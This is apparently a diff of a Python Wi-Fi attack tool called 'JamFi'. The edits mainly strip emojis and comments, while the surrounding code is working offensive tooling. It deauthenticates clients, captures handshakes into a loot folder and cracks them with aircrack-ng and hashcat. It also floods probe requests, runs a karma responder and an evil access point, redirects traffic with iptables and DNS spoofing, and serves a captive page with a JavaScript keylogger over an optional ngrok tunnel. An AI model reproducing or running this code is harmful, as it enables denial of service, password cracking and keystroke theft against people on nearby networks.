@@ -9,7 +9,7 @@ from random import choice, randint
 from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
 
 if not os.path.isdir("loot"):
-    print("📁 Missing loot folder. Creating it now.")
+    print(" Missing loot folder. Creating it now.")
     os.makedirs("loot", exist_ok=True)
 
 def require_root():
@@ -49,8 +49,8 @@ def print_banner():
 ██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
 ╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
  ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
-        💜  JamFi Wi-Fi Chaos Tool  💜
-              by ekoms savior
+         JamFi Wi-Fi Chaos Tool  
+            by ekoms savior
 """)
 
 def channel_hopper(iface):
@@ -118,7 +118,7 @@ def deauth_attack():
         time.sleep(2)
     frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
     sendp(frame, iface=iface, count=count, inter=delay)
-    print("✅ Deauth complete!")
+    print(" Deauth complete!")
 
 def deauth_all():
     iface = input(" Monitor mode interface: ").strip()
@@ -127,18 +127,18 @@ def deauth_all():
         return
     count = int(input(" Number of packets per client (default 100): ") or 100)
     delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
-    print("💥 Deauthing all clients and sniffing handshakes...\n")
+    print(" Deauthing all clients and sniffing handshakes...\n")
 
     for bssid, data in scan_results.items():
-        # 🔐 Sequential handshake capture to avoid socket overload
-        print(f"📡 Sniffing handshake for {bssid} ({seen_aps.get(bssid, 'Unknown')})...")
+        
+        print(f" Sniffing handshake for {bssid} ({seen_aps.get(bssid, 'Unknown')})...")
         capture_handshake(iface, bssid)
 
         for client in data["clients"]:
             try:
                 frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                 sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
-                print(f"🚀 Deauthed {client} from {seen_aps.get(bssid, 'Unknown')}")
+                print(f" Deauthed {client} from {seen_aps.get(bssid, 'Unknown')}")
             except OSError as e:
                 print(f"❌ Error sending deauth to {client}: {e}")
 
@@ -150,12 +150,12 @@ def crack_handshakes():
         print("⚠️ No .pcap handshake files found in loot/")
         return
 
-    print("\n📁 Available Handshakes:")
+    print("\n Available Handshakes:")
     for i, p in enumerate(pcaps):
         print(f"{i+1}. {p}")
     choice = input(" Choose a handshake file to crack: ").strip()
     if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
-        print("⚠️ Invalid selection.")
+        print(" Invalid selection.")
         return
     pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
     
@@ -167,18 +167,18 @@ def crack_handshakes():
         subprocess.run(["aircrack-ng", pcap_file, "-w", wordlist])
     elif method == "2":
         hccapx = pcap_file.replace(".pcap", ".hccapx")
-        print("🔄 Converting pcap to hccapx...")
+        print(" Converting pcap to hccapx...")
         subprocess.run(["cap2hccapx", pcap_file, hccapx])
         print(" Launching Hashcat...")
         subprocess.run(["hashcat", "-m", "2500", hccapx, wordlist, "--force"])
     else:
-        print("⚠️ Invalid choice.")
+        print(" Invalid choice.")
 
 def probe_spammer(iface=None):
     if iface is None:
         iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
-    print("📡 Spamming probe requests...")
+    print(" Spamming probe requests...")
     while True:
         for ssid in ssids:
             pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
@@ -197,7 +197,7 @@ def junk_flood(iface=None):
 def karma_responder(iface=None):
     if iface is None:
         iface = input(" Monitor mode interface (e.g. wlan0mon): ").strip()
-    print("🧲 Karma responder: answering all probe requests...")
+    print(" Karma responder: answering all probe requests...")
     def handle(pkt):
         if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
             ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
@@ -208,27 +208,27 @@ def karma_responder(iface=None):
     sniff(iface=iface, prn=handle)
 
 def chaos_mode():
-    print("💃 Chaos Mode Engaged!")
+    print(" Chaos Mode Engaged!")
     iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     if not iface:
-        print("⚠️ Interface not entered.")
+        print("⚠ Interface not entered.")
         return
     Thread(target=probe_spammer, args=(iface,), daemon=True).start()
     Thread(target=junk_flood, args=(iface,), daemon=True).start()
     Thread(target=karma_responder, args=(iface,), daemon=True).start()
 
 def evil_ap_mode():
-    print("👿 Starting Fully Connectable Evil AP Mode...")
+    print("Starting Fully Connectable Evil AP Mode...")
 
-    iface = input("💜 Interface (e.g. wlan0): ").strip()
-    ssid = input("💜 SSID to broadcast (e.g. Free_Public_WiFi): ").strip()
+    iface = input(" Interface (e.g. wlan0): ").strip()
+    ssid = input(" SSID to broadcast (e.g. Free_Public_WiFi): ").strip()
 
     os.makedirs("loot", exist_ok=True)
 
-    print("🧹 Cleaning up old services...")
+    print("Cleaning up old services...")
     cleanup_services(iface)
 
-    print("🌐 Configuring network interface...")
+    print(" Configuring network interface...")
     subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
     subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
     subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
@@ -260,8 +260,7 @@ log-dhcp
     with open("loot/dnsmasq.conf", "w") as f:
         f.write(dnsmasq_conf)
 
-    # Start services
-    print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
+    print(f"Starting Evil AP on {iface} with SSID: {ssid}")
     subprocess.Popen(["sudo", "hostapd", "loot/hostapd.conf"])
     time.sleep(2)
 
@@ -295,18 +294,17 @@ def mitm_hid_injection():
     import subprocess
     from http.server import BaseHTTPRequestHandler, HTTPServer
 
-    print("🧠 Starting MITM HID Injection Mode...")
-    iface = input("💜 Interface (e.g. wlan0): ").strip()
-    ssid = input("💜 SSID clients think they’re connecting to: ").strip()
-    fake = input("💜 Fake SSID to broadcast: ").strip()
+    print("Starting MITM HID Injection Mode...")
+    iface = input("Interface (e.g. wlan0): ").strip()
+    ssid = input("SSID clients think they’re connecting to: ").strip()
+    fake = input("Fake SSID to broadcast: ").strip()
 
-    use_ngrok = input("🌍 Use Ngrok for remote access? (y/n): ").strip().lower() == "y"
+    use_ngrok = input("Use Ngrok for remote access? (y/n): ").strip().lower() == "y"
 
     os.makedirs("loot", exist_ok=True)
     os.makedirs("payloads", exist_ok=True)
 
-    # 📦 Payload selector
-    print("\n📦 Available Payloads in /payloads:")
+    print("\n Available Payloads in /payloads:")
     payload_files = [f for f in os.listdir("payloads") if os.path.isfile(os.path.join("payloads", f))]
     for i, f in enumerate(payload_files):
         print(f"{i+1}) {f}")
@@ -317,12 +315,10 @@ def mitm_hid_injection():
         selected_payload = payload_files[int(choice)-1]
         shutil.copyfile(f"payloads/{selected_payload}", f"loot/{selected_payload}")
 
-    # 📝 Log files
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
     session_log = f"session_log_{timestamp}.txt"
     keystroke_log = f"keystroke_log_{timestamp}.txt"
-
-    # 🌐 Set up network
+    
     cleanup_services(iface)
     subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
     subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface])
@@ -349,7 +345,6 @@ dhcp-option=6,10.0.0.1
 server=8.8.8.8
 """.strip())
 
-    # 🌐 Start Ngrok if requested
     public_url = "http://10.0.0.1"
     if use_ngrok:
         print("🚀 Launching Ngrok tunnel on port 80...")
@@ -358,11 +353,10 @@ server=8.8.8.8
         try:
             res = requests.get("http://localhost:4040/api/tunnels")
             public_url = res.json()["tunnels"][0]["public_url"]
-            print(f"🌍 Ngrok Public URL: {public_url}")
+            print(f"Ngrok Public URL: {public_url}")
         except:
             print("❌ Failed to get Ngrok URL. Falling back to local IP.")
 
-    # 🧠 JS Keylogger + redirect
     with open("loot/injection.html", "w") as f:
         f.write(f"""<html><body>
 <h2>Welcome to {ssid}</h2>
@@ -396,15 +390,17 @@ setTimeout(() => {{
     open(session_log, "a").close()
     open(keystroke_log, "a").close()
 
-    print(f"Broadcasting SSID: {fake}")
+        print(f"Broadcasting SSID: {fake}")
     subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
     time.sleep(2)
     subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
+
     print("Starting Python DNS spoofer...")
     subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
+
 
 
     class HIDHandler(BaseHTTPRequestHandler):
@@ -454,26 +450,26 @@ setTimeout(() => {{
     try:
         HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
     except KeyboardInterrupt:
-        print("🛑 Server stopped.")
+        print("Server stopped.")
     finally:
         cleanup_services(iface)
 
 def main():
     print_banner()
     while True:
-        print("\n🔹 1️⃣  Scan Clients & APs 🔍")
-        print("🔹 2️⃣  Deauth One Client 💥")
-        print("🔹 3️⃣  Deauth ALL Clients + Capture 🔓")
-        print("🔹 4️⃣  Crack Captured Handshakes 🔓")
-        print("🔹 5️⃣  Probe Request Spam 📡")
-        print("🔹 6️⃣  Junk Packet Flood 💣")
-        print("🔹 7️⃣  Karma Responder 🧲")
-        print("🔹 8️⃣  Chaos Mode 💃")
-        print("🔹 9️⃣  View Loot 📁")
-        print("🔹 🔟  Evil AP 👿")
-        print("🔹 11️⃣ MITM HID Injection 🧠")
-        print("🔹 0️⃣  Quit ❌")
-        choice = input("💜 Choose an option: ").strip()
+        print("\n🔹 1️⃣  Scan Clients & APs ")
+        print("🔹 2️⃣  Deauth One Client ")
+        print("🔹 3️⃣  Deauth ALL Clients + Capture ")
+        print("🔹 4️⃣  Crack Captured Handshakes ")
+        print("🔹 5️⃣  Probe Request Spam ")
+        print("🔹 6️⃣  Junk Packet Flood ")
+        print("🔹 7️⃣  Karma Responder ")
+        print("🔹 8️⃣  Chaos Mode ")
+        print("🔹 9️⃣  View Loot ")
+        print("🔹 🔟  Evil AP ")
+        print("🔹 11️⃣ MITM HID Injection ")
+        print("🔹 0️⃣  Quit ")
+        choice = input(" Choose an option: ").strip()
 
         if choice == "1": scan_clients()
         elif choice == "2": deauth_attack()
@@ -487,7 +483,7 @@ def main():
         elif choice == "10": evil_ap_mode()
         elif choice == "11": mitm_hid_injection()
         elif choice == "0":
-            print("👋 Goodbye fren! XOXOXO 💜")
+            print("Goodbye fren!")
             cleanup_services()
             sys.exit()
         else:
